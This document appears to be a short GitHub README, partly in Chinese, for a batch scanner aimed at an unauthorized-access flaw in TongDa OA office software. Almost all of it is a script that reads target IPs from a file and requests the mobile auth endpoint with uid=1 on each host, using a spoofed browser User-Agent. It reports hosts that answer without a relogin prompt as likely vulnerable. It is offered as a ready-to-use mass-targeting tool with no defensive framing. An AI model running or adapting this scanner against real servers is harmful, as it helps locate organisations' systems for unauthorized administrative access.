# TongDa-OA-Authorized-

通达OA未授权访问，可批量。
```
#define vul_test_dir = /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
#define bug = RELOGIN
#define success = 200

function main(args){
	dirs = StrSplit(ReadFile("script\漏洞探测\通达OA\ip.txt"),StrRN());
	num = GetArrayNum(dirs);
	i = 0;
	while(i<num){
		try{
			res = HttpGet(dirs[ToInt(i)].vul_test_dir,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
			if(StrFindStr(res[0],bug,0) != "-1"){
				printclolor(dirs[ToInt(i)]." [-]当前OA无人在线",2);
			}else{
				if(StrFindStr(res[1],success,0) != "-1"){
					printclolor(dirs[ToInt(i)]." [+]可能存在通达OA未授权访问漏洞",3);
				}
				}
			}
catch{
				printclolor(dirs[ToInt(i)]." [-]目标连接失败！",5);
		}
		i = ToInt(i+1);
	}
	
}

```

## 截图

![](./re.png)